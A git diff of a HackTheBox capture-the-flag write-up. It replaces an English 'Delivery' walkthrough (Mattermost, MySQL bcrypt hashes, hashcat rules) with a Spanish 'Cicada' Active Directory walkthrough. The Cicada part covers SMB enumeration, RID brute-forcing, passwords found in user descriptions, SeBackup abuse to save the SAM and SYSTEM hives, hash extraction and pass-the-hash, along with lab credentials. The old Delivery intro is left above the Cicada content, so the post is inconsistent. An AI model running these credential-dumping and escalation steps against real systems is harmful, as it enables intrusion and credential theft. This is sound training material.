@@ -10,215 +10,191 @@ header:
   icon: /assets/images/hackthebox.webp
 categories:
   - hackthebox
-  - infosec
+  - windows
 tags:  
-  - osticket
-  - mysql
-  - mattermost
-  - hashcat
-  - rules
+  - passthehash
+  - ldapdump
+  - AD
+  - enumeration
+  - netexec
 ---
 
 ![](/assets/images/htb-writeup-cicada/cicada_logo.jpg)
 
 Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell.
 
-## Portscan
+## Escaneo de Puertos
 
 ```
-Nmap scan report for 10.129.148.141
-Host is up (0.018s latency).
-Not shown: 65532 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
-|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
-|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
-80/tcp   open  http    nginx 1.14.2
-|_http-server-header: nginx/1.14.2
-|_http-title: Welcome
-8065/tcp open  unknown
-| fingerprint-strings: 
-|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
-|     HTTP/1.1 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     Connection: close
-|     Request
-|   GetRequest: 
-|     HTTP/1.0 200 OK
-|     Accept-Ranges: bytes
-|     Cache-Control: no-cache, max-age=31556926, public
-|     Content-Length: 3108
-|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
-|     Content-Type: text/html; charset=utf-8
-|     Last-Modified: Sun, 09 May 2021 00:00:02 GMT
-|     X-Frame-Options: SAMEORIGIN
-|     X-Request-Id: fqrpd5m3ftgnzmxkbieezqadxo
-|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
-|     Date: Sun, 09 May 2021 00:01:31 GMT
-|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
-|   HTTPOptions: 
-|     HTTP/1.0 405 Method Not Allowed
-|     Date: Sun, 09 May 2021 00:01:31 GMT
-|_    Content-Length: 0
+Nmap scan report for cicada.htb (10.10.11.35)
+Host is up (0.12s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-29 10:29:04Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+50823/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 6h59m55s
+| smb2-time: 
+|   date: 2024-09-29T10:29:58
+|_  start_date: N/A
 ```
 
-## Website
+## Enumeración
 
-The Delivery website is pretty basic, there's a link to a vhost called helpdesk.delivery.htb and a contact us section. We'll add this entry to our local host before proceeding further.
+Empezamos enumerando los recursos compartidos por SMB, empleando el siguiente comando: `smbclient -L 10.10.11.35`. Para conectarnos por SMB con una null session.
 
-![](/assets/images/htb-writeup-delivery/website1.png)
+![](/assets/images/htb-writeup-cicada/smbclient.png)
 
-The contact us section tells us we need an @delivery.htb email address and tells us port 8065 is a MatterMost server. MatterMost is a Slack-like collaboration platform that can be self-hosted.
+Intentamos acceder a cada recursos compartido. Sin embargo, no nos deja iniciar sin credenciales o está vacío. No obstante en el recurso HR obtenemos el siguiente archivo:
 
-![](/assets/images/htb-writeup-delivery/website2.png)
+![](/assets/images/htb-writeup-cicada/smbclient_HR.png)
 
-Browsing to port 8065 we get the MatterMost login page but we don't have credentials yet
+Lo descargamos a nuestra máquina de atacante con el siguiente comando: `get Notice\ from\ HR.txt`
 
-![](/assets/images/htb-writeup-delivery/mm1.png)
+Una vez descargamos y leemos su contenido
 
-## Helpdesk
+![](/assets/images/htb-writeup-cicada/creds.png)
 
-The Helpdesk page uses the OsTicket web application. It allows users to create and view the status of ticket.
+Observamos que tenemos la contraseña `Cicada$M6Corpb*@Lp#nZp!8`
 
-![](/assets/images/htb-writeup-delivery/helpdesk3.png)
+Ahora debemos enumerar los usuarios existentes del dominio, para ello usamos la herramienta netexec (también se puede usar crackmapexec) con el parámetro `--rid-brute`.
+Empleamos el siguiente comando: `netexec smb 10.10.11.35 -u guest -p '' --rid-brute`.
 
-We can still open new tickets even if we only have a guest user.
+![](/assets/images/htb-writeup-cicada/users_nxc.png)
 
-![](/assets/images/htb-writeup-delivery/helpdesk1.png)
+Lo guardamos en el archivo `rid.txt` y ejecutamos el siguiente comando para filtrar solo por los usuarios: 
 
-After a ticket has been created, the system generates a random @delivery.htb email account with the ticket ID.
+`cat rid.txt | grep SidTypeUser | awk '{print $6}' | awk -F\\ '{print $2}' > users.txt`
 
-![](/assets/images/htb-writeup-delivery/helpdesk2.png)
+Validamos las credenciales con netexec
 
-Now that we have an email account we can create a MatterMost account.
+![](/assets/images/htb-writeup-cicada/shares.png)
 
-![](/assets/images/htb-writeup-delivery/mm2.png)
+Podemos observar la credencial válida es de `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`
 
-A confirmation email is then sent to our ticket status inbox.
+Empleando ldapdomaindump dumpeamos toda la información del dominio
 
-![](/assets/images/htb-writeup-delivery/mm3.png)
+![](/assets/images/htb-writeup-cicada/ldapdomaindump_michael.png)
+![](/assets/images/htb-writeup-cicada/ldapdomaindump_michael2.png)
 
-We use the check ticket function on the OsTicket application and submit the original email address we used when creating the ticket and the ticket ID.
+Leemos el contenido del archivo `domain_users.json`
 
-![](/assets/images/htb-writeup-delivery/mm4.png)
+Observamos que la contraseña del usuario david.orelious está en la descripción
 
-We're now logged in and we see that the MatterMost confirmation email has been added to the ticket information.
+![](/assets/images/htb-writeup-cicada/david_orelious_creds.png)
 
-![](/assets/images/htb-writeup-delivery/mm5.png)
+Ya tenemos las credenciales de `david.orelious:aRt$Lp#7t*VQ!3`
 
-To confirm the creation of our account we'll just copy/paste the included link into a browser new tab.
+Con estas credenciales comprobamos los recursos a los que podemos acceder y notamos que podemos acceder al recurso `DEV` con permisos de lectura
 
-![](/assets/images/htb-writeup-delivery/mm6.png)
+![](/assets/images/htb-writeup-cicada/smb_david.png)
 
-After logging in to MatterMost we have access to the Internal channel where we see that credentials have been posted. There's also a hint that we'll have to use a variation of the `PleaseSubscribe!` password later.
+![](/assets/images/htb-writeup-cicada/smb_david2.png)
 
-![](/assets/images/htb-writeup-delivery/mm7.png)
+Descargamos el archivo `Backup_script.ps1` y leemos su contenido
 
-## User shell
+![](/assets/images/htb-writeup-cicada/emily_oscars_creds.png)
 
-With the `maildeliverer / Youve_G0t_Mail!` credentials we can SSH in and get the user flag.
+Obtenemos las credenciales de `emily.oscars:Q!3@Lp#M6b*7t*Vt`
 
-```
-![](/assets/images/htb-writeup-delivery/user.png)
-```
+## User Shell
 
-## Credentials in MySQL database
+Validamos las credenciales de emily con netexec y observamos que nos sale (Pwn3d!)
 
-After doing some recon we find the MatterMost installation directory in `/opt/mattermost`:
+![](/assets/images/htb-writeup-cicada/emily_pwned.png)
 
-```
-maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermost
-matterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermost
-```
+Lo que significa que tenemos acceso remoto a la máquina víctima
 
-The `config.json` file contains the password for the MySQL database:
+Nos conectaremos con evil-winrm con las credenciales de emily y accedemos a la máquina víctima
 
-```
-[...]
-"SqlSettings": {
-        "DriverName": "mysql",
-        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
-[...]
-```
+![](/assets/images/htb-writeup-cicada/emily_shell.png)
 
-We'll connect to the database server and poke around.
+Y obtenemos nuestra primera flag
 
-```
-maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MariaDB connection id is 91
-Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+![](/assets/images/htb-writeup-cicada/user_flag.png)
 
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+## Escalada de Privilegios
 
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+Empleamos el comando whoami /priv para averiguar los privilegios que tiene el usuario
 
-MariaDB [(none)]> show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| mattermost         |
-+--------------------+
-```
+![](/assets/images/htb-writeup-cicada/emily_priv.png)
 
-MatterMost user accounts are stored in the `Users` table and hashed with bcrypt. We'll save the hashes then try to crack them offline.
+Notamos que tenemos los privilegios de SeBackup y SeRestore
 
-```
-MariaDB [(none)]> use mattermost;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
+Nos guiamos de la siguiente página [https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) para abusar de estos privilegios y escalar como administrador
 
-Database changed
-MariaDB [mattermost]> select Username,Password from Users;
-+----------------------------------+--------------------------------------------------------------+
-| Username                         | Password                                                     |
-+----------------------------------+--------------------------------------------------------------+
-| surveybot                        |                                                              |
-| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
-| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
-| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
-| snowscan                         | $2a$10$spHk8ZGr54VWf4kNER/IReO.I63YH9d7WaYp9wjiRswDMR.P/Q9aa |
-| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
-| channelexport                    |                                                              |
-| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
-+----------------------------------+--------------------------------------------------------------+
-8 rows in set (0.002 sec)
-```
+Nos vamos al directorio C:\ y creamos el directorio Temp
 
-## Cracking with rules
+![](/assets/images/htb-writeup-cicada/priv1.png)
 
-There was a hint earlier that some variation of `PleaseSubscribe!` is used.
+estando en C:\Temp\ ejecutamos el siguiente comando:
+`reg save hklm\sam C:\Temp\sam`
+`reg save hklm\system C:\Temp\system`
 
-I'll use hashcat for this and since I don't know the hash ID for bcrypt by heart I can find it in the help.
+Teniendo los archivos sam y system, lo descargamos a nuestra máquina
+![](/assets/images/htb-writeup-cicada/priv2.png)
 
-```
-C:\bin\hashcat>hashcat --help | findstr bcrypt
-   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
-```
+En nuestra máquina, usaremos pypykatz (mimikatz empleando python) para extraer los hashes de los usuarios
 
-My go-to rules is normally one of those two ruleset:
+`pypykatz registry --sam sam system`
 
-- [https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule](https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule)
-- [https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule)
+Otra forma: `impacket-secretsdump -sam sam -system system local`
 
-These will perform all sort of transformations on the wordlist and we can quickly crack the password: `PleaseSubscribe!21`
+![](/assets/images/htb-writeup-cicada/priv3.png)
 
-```
-C:\bin\hashcat>hashcat -a 0 -m 3200 -w 3 -O -r rules\_NSAKEY.v2.dive.rule hash.txt wordlist.txt
-[...]
-$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
+Una vez obtenido los hashes, podemos conectarnos como administrador realizando PasstheHash
 
-Session..........: hashcat
-Status...........: Cracked
-Hash.Name........: bcrypt $2*$, Blowfish (Unix)
-[...]
-```
+Ya como administrador obtenemos la flag de root
 
-The root password from MatterMost is the same as the local root password so we can just su to root and get the system flag.
+![](/assets/images/htb-writeup-cicada/priv4.png)
 
-```
-![](/assets/images/htb-writeup-delivery/root.png)
-```
+## Otra forma (No intencionado -> obtener root.txt sin ser administrador)
+
+En la máquina víctima ejecutamos:
+
+`robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B`
+`type C:\Users\Public\root.txt`
+
+Y obtendremos el archivo root.txt
+
+![](/assets/images/htb-writeup-cicada/root1.png)
+
+![](/assets/images/htb-writeup-cicada/pwned.png)
